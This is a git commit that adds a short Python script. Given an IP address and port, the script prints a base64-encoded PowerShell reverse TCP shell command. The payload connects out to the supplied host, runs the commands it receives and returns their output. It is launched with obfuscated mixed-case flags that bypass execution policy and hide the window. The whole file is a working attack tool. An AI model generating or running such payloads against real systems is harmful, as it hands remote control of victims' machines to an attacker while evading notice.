d16b3f8c75652e058ff5ce7f5e9c0c0cfe6f0284
josewdf <60181010+josemlwdf@users.noreply.github.com>
2023-11-23 11:26:58 +0100

    Create PowerShellBase64ReverseShell.py
    Python script for constructing a PowerShell reverse TCP shell. The script takes command-line arguments for IP address and port, generating a base64-encoded payload to establish a reverse shell connection.

---
+++ PowerShellBase64ReverseShell.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python3
+
+import sys; import base64;
+
+def exploit():
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    payload = 'Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("{ip}",{port}))'.format(ip=ip, port=port) + ';Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + "PS " + (pwd).Path + "> ");Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+
+    cmd = 'POwErsheLL -EXEcUtiONP  bypasS -NoprOf -Win hId -e {}'.format(base64.b64encode(payload.encode('utf16')[2:]).decode())
+    print(cmd)
+
+if len(sys.argv) < 3:
+    print('USAGE: ' + sys.argv[0] + ' LHOST + LPORT')
+else:
+    exploit()
